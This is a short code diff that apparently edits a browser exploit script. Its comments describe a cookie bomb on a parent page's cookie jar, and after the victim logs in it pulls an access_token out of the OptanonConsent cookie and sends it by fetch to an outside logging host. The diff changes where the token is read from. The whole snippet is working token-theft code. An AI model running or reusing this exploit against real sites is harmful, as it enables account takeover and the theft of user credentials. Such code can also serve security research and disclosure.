@@ -1,4 +1,3 @@
- var real = parent.document.cookie;
 
   // 2. cookie bomb on the PARENT jar
   for (var i = 0, prev = -1; i < 400; i++) {
@@ -26,7 +25,7 @@
 
     // 5. after the login, ship the OptanonConsent token from the pre-bomb snapshot
     setTimeout(function () {
-      var t = (real.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
+      var t = (document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
       t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
       if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + t);
     }, 10000);
